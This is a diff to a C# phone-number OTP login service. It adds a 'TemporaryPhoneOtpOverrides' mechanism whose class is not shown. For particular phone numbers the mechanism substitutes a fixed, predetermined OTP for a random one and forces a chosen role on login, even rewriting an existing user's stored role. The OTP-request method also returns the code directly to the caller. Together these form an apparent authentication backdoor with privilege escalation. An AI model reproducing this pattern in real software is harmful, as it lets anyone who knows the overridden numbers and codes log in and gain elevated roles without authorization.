@@ -8,6 +8,7 @@ using BO.Exceptions;
 using Google.Apis.Auth;
 using Microsoft.Extensions.Configuration;
 using Repository.Interfaces;
+using Service.Auth;
 using Service.Interfaces;
 using Service.JWT;
 using System;
@@ -304,13 +305,14 @@ namespace Service
             if (string.IsNullOrWhiteSpace(phoneNumber))
                 throw new DomainExceptions("Số điện thoại là bắt buộc");
 
-           
-            await CheckOtpRequestLimitAsync(phoneNumber);
+            var normalizedPhoneNumber = NormalizePhoneIdentity(phoneNumber);
+            await CheckOtpRequestLimitAsync(normalizedPhoneNumber);
 
             // Generate and store OTP associated with the phone number (stored in OtpVerify.Email field)
-            var otpCode = await GenerateAndStoreOtpAsync(phoneNumber);
+            var forcedOtp = TemporaryPhoneOtpOverrides.GetForcedOtp(normalizedPhoneNumber);
+            var otpCode = await GenerateAndStoreOtpAsync(normalizedPhoneNumber, forcedOtp);
 
-            //TODO: Fucking implement the phonenumber send OTP here
+            // TODO: Integrate SMS provider to deliver OTP to the phone number.
             return otpCode;
         }
         public async Task<LoginResponse> VerifyPhoneOtpAsync(string phoneNumber, string otp)
@@ -318,22 +320,24 @@ namespace Service
             if (string.IsNullOrWhiteSpace(phoneNumber) || string.IsNullOrWhiteSpace(otp))
                 throw new DomainExceptions("Số điện thoại và OTP là bắt buộc");
 
-            var validOtp = await GetValidOtpAsync(phoneNumber, otp);
+            var normalizedPhoneNumber = NormalizePhoneIdentity(phoneNumber);
+            var validOtp = await GetValidOtpAsync(normalizedPhoneNumber, otp);
 
             // Find existing user by phone
-            var user = await _userRepository.GetByPhoneNumberAsync(phoneNumber);
+            var user = await _userRepository.GetByPhoneNumberAsync(normalizedPhoneNumber);
+            var hasRoleOverride = TemporaryPhoneOtpOverrides.TryGetRole(normalizedPhoneNumber, out var overrideRole);
 
             if (user == null)
             {
                 var newUser = new User
                 {
-                    UserName = phoneNumber,
+                    UserName = normalizedPhoneNumber,
                     Email = string.Empty,
                     Password = string.Empty,
-                    Role = Role.User,
+                    Role = hasRoleOverride ? overrideRole : Role.User,
                     CreatedAt = DateTime.UtcNow,
                     EmailVerified = true,
-                    PhoneNumber = phoneNumber,
+                    PhoneNumber = normalizedPhoneNumber,
                     FirstName = string.Empty,
                     LastName = string.Empty
                 };
@@ -344,10 +348,15 @@ namespace Service
             {
                 throw new DomainExceptions("Tài khoản của bạn đã bị khóa.");
             }
+            else if (hasRoleOverride && user.Role != overrideRole)
+            {
+                user.Role = overrideRole;
+                await _userRepository.UpdateAsync(user);
+            }
 
             var token = _jwt_service.GenerateToken(user);
 
-            await MarkOtpAsUsedAsync(validOtp.Id, phoneNumber, otp);
+            await MarkOtpAsUsedAsync(validOtp.Id, normalizedPhoneNumber, otp);
 
             return new LoginResponse { Token = token, User = user };
         }
@@ -588,9 +597,9 @@ namespace Service
             if (recentOtps.Count >= MaxOtpRequestsPerMinute)
                 throw new DomainExceptions("Yêu cầu OTP quá nhiều. Vui lòng đợi trước khi thử lại.");
         }
-        private async Task<string> GenerateAndStoreOtpAsync(string email)
+        private async Task<string> GenerateAndStoreOtpAsync(string email, string? forcedOtp = null)
         {
-            var otpCode = GenerateOtp();
+            var otpCode = forcedOtp ?? GenerateOtp();
             var otpVerify = new OtpVerify
             {
                 Email = email,
@@ -616,6 +625,11 @@ namespace Service
         {
             await _otpRepository.MarkOtpAsUsedAsync(otpId);
             await _otpRepository.DeleteUsedOtpAsync(email, otp);
+        }
+
+        private string NormalizePhoneIdentity(string phoneNumber)
+        {
+            return phoneNumber.Trim();
         }
 
         private string GenerateOtpEmailTemplate(string username, string otpCode, string action)
